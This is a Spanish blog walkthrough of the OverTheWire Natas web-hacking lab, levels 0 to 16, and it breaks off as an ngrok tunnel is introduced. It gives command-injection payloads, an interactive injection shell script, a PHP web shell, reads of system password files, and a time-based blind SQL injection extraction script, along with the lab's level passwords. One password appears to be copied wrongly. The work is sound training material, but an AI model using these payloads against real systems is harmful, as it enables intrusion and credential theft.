@@ -1,0 +1,500 @@
+<!DOCTYPE html>
+<html lang="">
+
+<head>
+    <title>
+Los niveles de OverTheWire Natas 1-17 resueltos | passpow
+</title>
+
+    <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+
+<meta name="generator" content="Hugo 0.80.0" />
+
+
+<link rel="canonical" href="/posts/natas-otw/" >
+<link href="/sass/main.min.7c57d7795628d7c025cc5db105e8a8d02017cfd7b77929b93c867586a4b49d65.css" rel="stylesheet">
+
+
+
+</head>
+
+<body>
+
+    <div class="flexWrapper">
+        <header class="headerWrapper">
+    <div class="header">
+        <div>
+            <a href="">
+                <span class="terminal">passpow@passpow.github.io ~ $</span>
+            </a>
+        </div>
+        <input class="side-menu" type="checkbox" id="side-menu">
+        <label class="hamb" for="side-menu"><span class="hamb-line"></span></label>
+        <nav class="headerLinks">
+            <ul>
+                
+                <li>
+                    <a href="/about" title="" >
+                        ~/about</a>
+                </li>
+                
+                <li>
+                    <a href="/posts" title="" >
+                        ~/posts</a>
+                </li>
+                
+            </ul>
+        </nav>
+    </div>
+</header>
+
+
+        <div class="content">
+            <main class="main">
+                
+<div class="postWrapper">
+    <h1>Los niveles de OverTheWire Natas 1-17 resueltos</h1>
+    
+    <section class="postMetadata">
+        <dl>
+            
+                
+<dt>tags</dt>
+<dd><span></span>
+    <a href="/tags/hacking-web/">#Hacking Web</a><span></span>
+    <a href="/tags/python/">#python</a><span></span>
+    <a href="/tags/sql/">#sql</a><span></span>
+    <a href="/tags/crypto/">#crypto</a><span></span>
+    <a href="/tags/bash/">#bash</a></dd>
+            
+            
+            
+            
+                <dt>published</dt>
+                
+                <dd><time datetime="2023-10-14">14 Oct 2023</time></dd>
+            
+            
+                <dt>reading time</dt>
+                <dd>9 minutes</dd>
+            
+        </dl>
+    </section>
+    
+    <div>
+        <p>Writeup Natas</p>
+<p><img src="/posts/images/natas/otw.png" alt="Icono OTW"></p>
+<hr>
+<h1 id="introducción">Introducción</h1>
+<p>Natas es uno de los apartados en la web OverTheWire, en este caso este es de hacking web pero la web está bastante bien y tienen de más temáticas, por ejemplo bash, en un futuro pienso ir resolviendo más de estos ejercicios y subir esta especie de Writeup al blog.</p>
+<hr>
+<h2 id="natas0">Natas0</h2>
+<p>Simplemente mediante control+u puedes ver la contraseña de natas1 en un comentario de html.</p>
+<p><img src="/posts/images/natas/natas0.png" alt="Natas0"></p>
+<p><strong>natas1:g9D9cREhslqBKtcA2uocGHPfMZVzeFK6</strong></p>
+<hr>
+<h2 id="natas1">Natas1</h2>
+<p>Esta vez nos quitan el clic derecho pero igualmente con control+u somos capaces de leer la contraseña.</p>
+<p><img src="/posts/images/natas/natas1.png" alt="Natas1"></p>
+<p><strong>natas2:h4ubbcXrWqsTo7GGnnUMLppXbOogfBZ7</strong></p>
+<hr>
+<h2 id="natas2">Natas2</h2>
+<p>En este caso la clave ya no está en el comentario pero si vemos otra vez el código fuente llama la atención el directorio <strong>files</strong></p>
+<p><img src="/posts/images/natas/natas2.png" alt="Natas2"></p>
+<p>Si entramos en este directorio vemos como no quitaron el permiso de listar los archivos y vemos el archivo <strong>users.txt</strong></p>
+<p><img src="/posts/images/natas/natas2.2.png" alt="Natas2"></p>
+<p><strong>natas3:G6ctbMJ5Nb4cbFwhpMPSvxGHhQ7I6W8Q</strong></p>
+<hr>
+<h2 id="natas3">Natas3</h2>
+<p>Veo el contenido de esta web y tiene un comentario:</p>
+<p><em><!-- raw HTML omitted --></em></p>
+<p>Esto es una pista ya que existe un archivo robots.txt que le dice al motor de búsqueda de google a que sitios de su web puede acceder, visito robots.txt y encuentro el directorio <strong>/s3cr3t/</strong></p>
+<p><img src="/posts/images/natas/natas3.png" alt="Natas3"></p>
+<p>Cuando entro al directorio <strong>/s3cr3t/</strong> encuentro el archivo <strong>users.txt</strong> al igual que antes.</p>
+<p><strong>natas4:tKOcJIbzM4lTs8hbCmzn5Zr4434fGZQm</strong></p>
+<hr>
+<h2 id="natas4">Natas4</h2>
+<p><img src="/posts/images/natas/natas4.png" alt="Natas4"></p>
+<p>Existe una cabecera en http llamada <strong>Referer</strong> y en este caso parece que nos piden que sea <strong><a href="http://natas5.natas.labs.overthewire.org/">http://natas5.natas.labs.overthewire.org/</a></strong>, no es nada recomendable usar esto para comprobar el origen ya que podemos modificar nuestra cabeceras http libremente, en este caso mediante el uso de BurpSuite enviamos una petición con el Referer indicado.</p>
+<p><img src="/posts/images/natas/natas4.1.png" alt="Natas4"></p>
+<p>Enviamos la petición modificada y &hellip;</p>
+<p><img src="/posts/images/natas/natas4.2.png" alt="Natas4"></p>
+<p><strong>natas5:Z0NsrtIkJoKALBCLi5eqFfcRN82Au2oD</strong></p>
+<hr>
+<h2 id="natas5">Natas5</h2>
+<p><img src="/posts/images/natas/natas5.png" alt="Natas5"></p>
+<p>Otra vez mediante BurpSuite veo la petición y hay una cookie sin encriptar que llama la atención: <strong>loggedin:0</strong> cambio el valor a
+1.</p>
+<p><img src="/posts/images/natas/natas5.2.png" alt="Natas5"></p>
+<p>y envio la petición &hellip;</p>
+<p><img src="/posts/images/natas/natas5.3.png" alt="Natas5"></p>
+<p><strong>natas6:fOIvE0MDtPTgRhqmmvvAOt2EfXR6uQgR</strong></p>
+<hr>
+<h2 id="natas6">Natas6</h2>
+<p><img src="/posts/images/natas/natas6.png" alt="Natas6"></p>
+<p>Nada más entrar vemos que te pide que introduzcas el &ldquo;secreto&rdquo;.</p>
+<p><img src="/posts/images/natas/natas6.1.png" alt="Natas6"></p>
+<p>Al revisar el código del programa no vemos la clave en claro pero si que llama la atencion el archivo <strong>includes/secret.inc</strong> los
+archivos con extensión <strong>.inc</strong>, tienen ese nombre por convención ya que son importados por otros archivos de php.
+Al visitar este archivo, tenemos el secreto.</p>
+<p><img src="/posts/images/natas/natas6.2.png" alt="Natas6"></p>
+<p><strong>natas7:jmxSiH3SP6Sonf8dv66ng8v1cIEdjXWr</strong></p>
+<hr>
+<h2 id="natas7">Natas7</h2>
+<p><img src="/posts/images/natas/natas7.1.png" alt="Natas7"></p>
+<p>Nada más entrar a la web vemos dos opciones <em>home</em> y <em>about</em> al hacer clic en cualquiera de ellas vemos como carga la página
+y en la url tenemos un nuevo parámetro <em>page=home</em>, esto parece un <strong>LFI</strong>. Pruebo a cambiar home por <strong>/etc/passwd</strong> y &hellip;</p>
+<p><img src="/posts/images/natas/natas7.png" alt="Natas7"></p>
+<p>Ahora solo queda leer la flag de natas8 que según un comentario en la web se encuentra en <strong>/etc/natas_webpass/natas8</strong></p>
+<p><img src="/posts/images/natas/natas7.2.png" alt="Natas7"></p>
+<p><strong>natas8:a6bZCNYwdKqN5cGP11ZdtPg0iImQQhAB</strong></p>
+<hr>
+<h2 id="natas8">Natas8</h2>
+<p><img src="/posts/images/natas/natas8.png" alt="Natas8"></p>
+<p>Otra vez nos mandan introducir un secreto.</p>
+<p><img src="/posts/images/natas/natas8.1.png" alt="Natas8"></p>
+<p>Al ver el código de la pagina descubrimos la variable <strong>encodedSecret</strong> donde se almacena el secreto codificado
+<em>return bin2hex(strrev(base64_encode($secret)));</em> primero se le aplica base64 luego se invierte la cadena y por último hexadecimal.
+Pues lo decodificamos primero con hex <em>&ldquo;3d3d516343746d4d6d6c315669563362&rdquo;</em> = <em>&quot;==QcCtmMml1ViV3b&quot;</em> invertimos la cadena = <em>&ldquo;b3ViV1lmMmtCcQ==&quot;</em> y decodificamos con base64 = <em>&ldquo;oubWYf2kBq&rdquo;</em> ya tenemos el secreto.</p>
+<p><img src="/posts/images/natas/natas8.2.png" alt="Natas8"></p>
+<p><strong>natas9:Sda6t0vkOPkM8YeOZkAGVhFoaplvlJFd</strong></p>
+<hr>
+<h2 id="natas9">Natas9</h2>
+<p><img src="/posts/images/natas/natas9.png" alt="Natas9"></p>
+<p>La página parece filtrar la palabra input en un diccionario interno. Al ver el código del programa vemos que hace el filtro
+mediante: <em>grep -i <strong>{palabra}</strong> diccionario.txt</em>, para saltarnos esto llegaría con poner <em>|| ls #</em> para que cuando falle la primera instrucción se ejecute la segunda, que será el comando en cuestión y comentamos <em>diccionario.txt</em>.</p>
+<p><img src="/posts/images/natas/natas9.1.png" alt="Natas9"></p>
+<p>Mediante el siguiente script se puede obtener una especie de web shell.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">from</span> bs4 <span style="color:#66d9ef">import</span> BeautifulSoup
+<span style="color:#75715e"># passpow: passpow.github.io</span>
+
+headers <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;Basic bmF0YXM5OlNkYTZ0MHZrT1BrTThZZU9aa0FHVmhGb2FwbHZsSkZk&#39;</span>,
+    <span style="color:#e6db74">&#39;Cache-Control&#39;</span>: <span style="color:#e6db74">&#39;max-age=0&#39;</span>,
+    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+    <span style="color:#e6db74">&#39;Sec-GPC&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;yo&#39;</span>,
+}
+<span style="color:#66d9ef">while</span> <span style="color:#ae81ff">1</span>:
+    command<span style="color:#f92672">=</span>input(<span style="color:#e6db74">&#34;&gt; &#34;</span>)
+    params <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;needle&#39;</span>: <span style="color:#e6db74">&#39;asd || </span><span style="color:#e6db74">{}</span><span style="color:#e6db74"> #&#39;</span><span style="color:#f92672">.</span>format(command),
+    }
+
+    response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>get(<span style="color:#e6db74">&#39;http://natas9.natas.labs.overthewire.org/&#39;</span>, params<span style="color:#f92672">=</span>params, headers<span style="color:#f92672">=</span>headers, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>)
+    soup <span style="color:#f92672">=</span> BeautifulSoup(response<span style="color:#f92672">.</span>text, <span style="color:#e6db74">&#39;html.parser&#39;</span>)
+
+    print(soup<span style="color:#f92672">.</span>pre<span style="color:#f92672">.</span>text)</code></pre></div>
+<p>Aunque realmente nada de esto hace falta ya que la flag está como en el LFI de antes en <strong>/etc/natas_webpass/natas10</strong> y
+como usa <em>grep</em> podemos hacer que lea todo el archivo con el siguiente input: <code>&quot;&quot; /etc/natas_webpass/natas10 #</code> esto nos será útil en el siguiente nivel.</p>
+<p><img src="/posts/images/natas/natas9.2.png" alt="Natas9"></p>
+<p><strong>natas10:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE</strong></p>
+<hr>
+<h2 id="natas10">Natas10</h2>
+<p><img src="/posts/images/natas/natas10.png" alt="Natas10"></p>
+<p>Mediante el mismo comando de la anterior: <code>&quot;&quot; /etc/natas_webpass/natas10 #</code> conseguimos la flag.</p>
+<p><strong>natas11:D44EcsFkLxPIkAAKLosx8z3hxX1Z4MCE</strong></p>
+<hr>
+<h2 id="natas11">Natas11</h2>
+<p>Nos especifican que la cookie está encriptada con el cifrado XOR.</p>
+<p><img src="/posts/images/natas/XOR.jpg" alt="Natas11"></p>
+<p>Usa la puerta lógica XOR en cada bit cada letra de la cadena que forma la cookie siendo esta imagen la cookie A
+la clave B y el resultado cifrado. Realmente nosotros tenemos la cookie antes de ser modificicada y el resultado por lo
+que conseguir la clave realmente no es un problema.</p>
+<h3 id="conseguir-clave">Conseguir clave</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> base64
+
+data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;showpassword&#34;</span>: <span style="color:#e6db74">&#34;no&#34;</span>, <span style="color:#e6db74">&#34;bgcolor&#34;</span>: <span style="color:#e6db74">&#34;#ffffff&#34;</span>}
+data<span style="color:#f92672">=</span>json<span style="color:#f92672">.</span>dumps(data)
+
+cookie <span style="color:#f92672">=</span> base64<span style="color:#f92672">.</span>b64decode(<span style="color:#e6db74">&#34;MGw7JCQ5OC04PT8jOSpqdmkgJ25nbCorKCEkIzlscm5oKC4qLSgubjY=&#34;</span>)<span style="color:#f92672">.</span>decode(<span style="color:#e6db74">&#34;utf8&#34;</span>)
+
+result <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+
+<span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, len(cookie)):
+    result <span style="color:#f92672">+=</span> chr(ord(cookie[i]) <span style="color:#f92672">^</span> ord(data[i]))</code></pre></div>
+<p>Una vez teniendo la clave ciframos la cookie con el parámetro <em>&ldquo;showpassword&rdquo;: &ldquo;yes&rdquo;</em> y porque no en negro };)</p>
+<h3 id="cifrar-cookie">Cifrar cookie</h3>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> json
+<span style="color:#f92672">import</span> base64
+
+key <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;KNHL&#34;</span>
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">xor</span>(a, b, n):
+    ans <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;&#34;</span>
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(n):
+        <span style="color:#66d9ef">if</span> (a[i] <span style="color:#f92672">==</span> b[i]): 
+            ans <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;0&#34;</span>
+        <span style="color:#66d9ef">else</span>: 
+            ans <span style="color:#f92672">+=</span> <span style="color:#e6db74">&#34;1&#34;</span>
+    <span style="color:#66d9ef">return</span> ans 
+
+data <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;showpassword&#34;</span>: <span style="color:#e6db74">&#34;yes&#34;</span>, <span style="color:#e6db74">&#34;bgcolor&#34;</span>: <span style="color:#e6db74">&#34;#000000&#34;</span>} <span style="color:#75715e">#negro no?</span>
+data <span style="color:#f92672">=</span> json<span style="color:#f92672">.</span>dumps(data)
+mensaje_cifrado<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">for</span> i, caracter <span style="color:#f92672">in</span> enumerate(data):
+    clave_actual <span style="color:#f92672">=</span> key[i <span style="color:#f92672">%</span> len(key)]
+    caracter_cifrado <span style="color:#f92672">=</span> ord(caracter) <span style="color:#f92672">^</span> ord(clave_actual)  <span style="color:#75715e"># XOR </span>
+    mensaje_cifrado <span style="color:#f92672">+=</span> chr(caracter_cifrado)
+print(base64<span style="color:#f92672">.</span>b64encode(mensaje_cifrado<span style="color:#f92672">.</span>encode(<span style="color:#e6db74">&#34;utf&#34;</span>)))</code></pre></div>
+<p><img src="/posts/images/natas/natas11.1.png" alt="Natas11"></p>
+<p><strong>natas12:YWqo0pjpcXzSIl5NMAVxg12QxeC1w9QG</strong></p>
+<h2 id="natas12">Natas12</h2>
+<p><img src="/posts/images/natas/natas12.1.png" alt="Natas12"></p>
+<p>Una subida de archivos vulnerable, abrimos burp y encontramos el siguiente parámetro:</p>
+<p><img src="/posts/images/natas/natas12.2.png" alt="Natas12"></p>
+<p>El cual dicta como se almacenará el archivo en el servidor, lo modificamos con la siguiente webshell y le hacemos un cat a la contraseña ubicada en <strong>/etc/natas_webpass/natas13</strong></p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">html</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">body</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">form</span> <span style="color:#a6e22e">method</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;GET&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&lt;?php echo basename(</span><span style="color:#e6db74">$_SERVER[&#39;PHP_SELF&#39;]</span><span style="color:#e6db74">); ?&gt;&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;TEXT&#34;</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> <span style="color:#a6e22e">autofocus</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;cmd&#34;</span> <span style="color:#a6e22e">size</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;80&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">input</span> <span style="color:#a6e22e">type</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;SUBMIT&#34;</span> <span style="color:#a6e22e">value</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;Execute&#34;</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">form</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">pre</span><span style="color:#f92672">&gt;</span>
+<span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]))
+    {
+        <span style="color:#a6e22e">system</span>($_GET[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+    }
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span><span style="color:#960050;background-color:#1e0010">&lt;/pre&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/body&gt;
+</span><span style="color:#960050;background-color:#1e0010">&lt;/html&gt;
+</span></code></pre></div>
+<p><img src="/posts/images/natas/natas12.3.png" alt="Natas12"></p>
+<p><strong>natas13:lW3jYRI02ZKDBb8VtQBU1f6eDRo6WEj9</strong></p>
+<h2 id="natas13">Natas13</h2>
+<p>Esta vez la web verifica el tipo de archivo mediante los <a href="https://en.wikipedia.org/wiki/Magic_number_(programming)">&ldquo;magic numbers&rdquo;</a> de manera breve, son unos bytes en la cabecera de los archivos.
+En el caso de los archivos JPEG es la siguiente <strong>ff d8 ff e0</strong></p>
+<p><img src="/posts/images/natas/natas13.1.png" alt="Natas13"></p>
+<p>Para crear este archivo modificado mucha gente usa herramientas como <strong>HxD</strong> o <strong>hexeditor</strong> pero aquí lo haremos con python3 :)</p>
+<p><img src="/posts/images/natas/natas13.2.png" alt="Natas13"></p>
+<p>Simple, no? Ahora para ver si todo es correcto lo podemos chekear con <strong>file</strong> y podemos ver que lo detecta como JPEG image data.</p>
+<p><img src="/posts/images/natas/natas13.3.png" alt="Natas13"></p>
+<p>Ahora usaremos la misma técnica que en el ejercicio 12 con burpsuite</p>
+<p><img src="/posts/images/natas/natas13.4.png" alt="Natas13"></p>
+<p>Una vez subida esta webshell solo queda hacerle un cat a <strong>/etc/natas_webpass/natas14</strong> y ya :)</p>
+<p><em>?cmd=cat /etc/natas_webpass/natas14</em></p>
+<p>natas14:qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP</p>
+<h2 id="natas14">Natas14</h2>
+<p>Llegó el momento de las inyecciones SQL.</p>
+<p><img src="/posts/images/natas/natas14.1.png" alt="Natas14"></p>
+<p>La verdad es que no podría ser más mítica esta inyección, incluso he visto alguna camiseta con ella <br>
+<strong>&rdquo; or 1=1 #</strong> hará que la consuta a la base de datos sea True y por tanto nos dé la flag.</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
+<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;username&#34;</span>, $_REQUEST)) {
+    $link <span style="color:#f92672">=</span> <span style="color:#a6e22e">mysqli_connect</span>(<span style="color:#e6db74">&#39;localhost&#39;</span>, <span style="color:#e6db74">&#39;natas14&#39;</span>, <span style="color:#e6db74">&#39;&lt;censored&gt;&#39;</span>);
+    <span style="color:#a6e22e">mysqli_select_db</span>($link, <span style="color:#e6db74">&#39;natas14&#39;</span>);
+
+    $query <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;SELECT * from users where username=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$_REQUEST[<span style="color:#e6db74">&#34;username&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74"> and password=</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">.</span>$_REQUEST[<span style="color:#e6db74">&#34;password&#34;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\&#34;</span><span style="color:#e6db74">&#34;</span>;
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">array_key_exists</span>(<span style="color:#e6db74">&#34;debug&#34;</span>, $_GET)) {
+        <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Executing query: </span><span style="color:#e6db74">$query</span><span style="color:#e6db74">&lt;br&gt;&#34;</span>;
+    }
+
+    <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">mysqli_num_rows</span>(<span style="color:#a6e22e">mysqli_query</span>($link, $query)) <span style="color:#f92672">&gt;</span> <span style="color:#ae81ff">0</span>) {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Successful login! The password for natas15 is &lt;censored&gt;&lt;br&gt;&#34;</span>;
+    } <span style="color:#66d9ef">else</span> {
+            <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#34;Access denied!&lt;br&gt;&#34;</span>;
+    }
+    <span style="color:#a6e22e">mysqli_close</span>($link);
+} <span style="color:#66d9ef">else</span> {
+<span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+</span></code></pre></div>
+<p><img src="/posts/images/natas/natas14.3.png" alt="Natas14"></p>
+<p><strong>natas15:TTkaI7AWG4iDERztBcEyKV7kRXH1EZRB</strong></p>
+<h2 id="natas16">Natas16</h2>
+<p>Esto ya se comienza a poner interesante, estamos ante una sqli blind de manual. Listamos el número de columnas mediante <strong>order by 2 #</strong></p>
+<p><img src="/posts/images/natas/natas15.1.png" alt="Natas15"></p>
+<p>Con esto calculamos el número de columnas de la tabla, y con <strong>union select &lsquo;pass&rsquo;,&lsquo;pow&rsquo; #</strong> que las 2 son tipo <strong>VARCHAR</strong></p>
+<p><img src="/posts/images/natas/natas15.3.png" alt="Natas15"></p>
+<p>Es importante comentar que lo sabemos ya que los outputs que nos devuelve la página víctima son una especie de <strong>True</strong>:</p>
+<p><img src="/posts/images/natas/natas15.4.png" alt="Natas15"></p>
+<p>Ya adelanté antes que se trata de una inyección a ciegas, en mi caso la realicé <em>Time Based</em>. Realmente en este caso
+se puede conseguir la flag vía <em>conditional errors</em> sin necesidad de esto, y puede que usar intervalos de tiempo sea matar un mosquito con un rifle&hellip;, pero seguramente no nos vendrá mal el script en próximos ejercicios de natas y además me encanta este método ;). Bueno pues manos a la obra, primero identificamos el tipo de base de datos que vamos a atacar, siguiendo la siguiente tabla vemos que estamos ante una base <strong>MySQL</strong>.</p>
+<table>
+<thead>
+<tr>
+<th>Gestor</th>
+<th>Sintaxis</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Oracle</strong></td>
+<td>SELECT banner FROM v$version, SELECT version FROM v$instance</td>
+</tr>
+<tr>
+<td><strong>Microsoft</strong></td>
+<td>SELECT @@version</td>
+</tr>
+<tr>
+<td><strong>PostgreSQL</strong></td>
+<td>SELECT version()</td>
+</tr>
+<tr>
+<td><strong>MySQL</strong></td>
+<td>SELECT @@version, 	SELECT version()</td>
+</tr>
+</tbody>
+</table>
+<p>Vale, ahora vamos a tratar de listar la password del usuario natas16, dejo esta <a href="https://github.com/kleiton0x00/Advanced-SQL-Injection-Cheatsheet/blob/main/MySQL%20-%20Time%20Based%20SQLi/README.md">cheatsheet</a> que la verdad es bastante completa y puede ayudarte.</p>
+<p><strong>&quot; union select if((select mid(password,1,1) from users where username=&ldquo;natas16&rdquo; limit 0,1) like binary &lsquo;a&rsquo;, SLEEP(10),1), null from users &ndash; -</strong></p>
+<p><strong>ES MUY IMPORTANTE</strong> que usemos el comparador <em>like binary</em> porque MySQL es case insensitive pero ese operador nos permite diferenciar los caracteres. En caso de comparar = te quedarán solo minúsculas. Pues a crear el script 😎️</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python3" data-lang="python3"><span style="color:#f92672">import</span> requests
+<span style="color:#f92672">import</span> string
+
+
+headers <span style="color:#f92672">=</span> {
+    <span style="color:#e6db74">&#39;Accept&#39;</span>: <span style="color:#e6db74">&#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8&#39;</span>,
+    <span style="color:#e6db74">&#39;Accept-Language&#39;</span>: <span style="color:#e6db74">&#39;es-ES,es;q=0.5&#39;</span>,
+    <span style="color:#e6db74">&#39;Authorization&#39;</span>: <span style="color:#e6db74">&#39;Basic bmF0YXMxNTpUVGthSTdBV0c0aURFUnp0QmNFeUtWN2tSWEgxRVpSQg==&#39;</span>,
+    <span style="color:#e6db74">&#39;Cache-Control&#39;</span>: <span style="color:#e6db74">&#39;max-age=0&#39;</span>,
+    <span style="color:#e6db74">&#39;Connection&#39;</span>: <span style="color:#e6db74">&#39;keep-alive&#39;</span>,
+    <span style="color:#e6db74">&#39;Content-Type&#39;</span>: <span style="color:#e6db74">&#39;application/x-www-form-urlencoded&#39;</span>,
+    <span style="color:#e6db74">&#39;Origin&#39;</span>: <span style="color:#e6db74">&#39;http://natas15.natas.labs.overthewire.org&#39;</span>,
+    <span style="color:#e6db74">&#39;Referer&#39;</span>: <span style="color:#e6db74">&#39;http://natas15.natas.labs.overthewire.org/&#39;</span>,
+    <span style="color:#e6db74">&#39;Sec-GPC&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;Upgrade-Insecure-Requests&#39;</span>: <span style="color:#e6db74">&#39;1&#39;</span>,
+    <span style="color:#e6db74">&#39;User-Agent&#39;</span>: <span style="color:#e6db74">&#39;yo&#39;</span>,
+}
+<span style="color:#66d9ef">def</span> <span style="color:#a6e22e">sqlitime</span>(letter, number):
+    data <span style="color:#f92672">=</span> {
+        <span style="color:#e6db74">&#39;username&#39;</span>: <span style="color:#e6db74">&#39;&#34; union select if((select mid(password,</span><span style="color:#e6db74">{}</span><span style="color:#e6db74">,1) from users where username=&#34;natas16&#34; limit 0,1) like binary </span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">{}</span><span style="color:#ae81ff">\&#39;</span><span style="color:#e6db74">, SLEEP(10),1), null from users -- -&#39;</span><span style="color:#f92672">.</span>format(number, letter),
+    }
+    <span style="color:#66d9ef">try</span>:
+        response <span style="color:#f92672">=</span> requests<span style="color:#f92672">.</span>post(<span style="color:#e6db74">&#39;http://natas15.natas.labs.overthewire.org/index.php&#39;</span>, headers<span style="color:#f92672">=</span>headers, data<span style="color:#f92672">=</span>data, verify<span style="color:#f92672">=</span><span style="color:#66d9ef">False</span>, timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">3</span>)
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">False</span>
+    <span style="color:#66d9ef">except</span>:
+        <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">True</span>
+
+n<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>
+total<span style="color:#f92672">=</span><span style="color:#e6db74">&#34;&#34;</span>
+<span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
+    <span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> string<span style="color:#f92672">.</span>ascii_letters<span style="color:#f92672">+</span>string<span style="color:#f92672">.</span>digits:
+       
+        <span style="color:#66d9ef">if</span> sqlitime(i, n):
+            total<span style="color:#f92672">+=</span>i
+            print(total)
+            n<span style="color:#f92672">+=</span><span style="color:#ae81ff">1</span>
+            <span style="color:#66d9ef">break</span></code></pre></div>
+<p>Creo que en lugar de <strong>mid</strong> se puede utilizar también <strong>substring</strong> aunque no lo he probado.</p>
+<p><img src="/posts/images/natas/natas15.2.png" alt="Natas15"></p>
+<p><strong>natas16:TRD7iZrd5gATjj9PkPEuaOlfEjHqj32V</strong></p>
+<h2 id="natas16-1">Natas16</h2>
+<p>En este caso parece que la única forma de ejecutar comandos en la máquina es mediante la siguiente instrucción <em>$(COMMAND)</em>
+esto lo que hace es ejecutar el resultado del comando. Por ejemplo:</p>
+<p><img src="/posts/images/natas/natas16.png" alt="Natas15"></p>
+<p>Por tanto se me ocurrió hacer un tunel por ngrok con el siguiente script.</p>
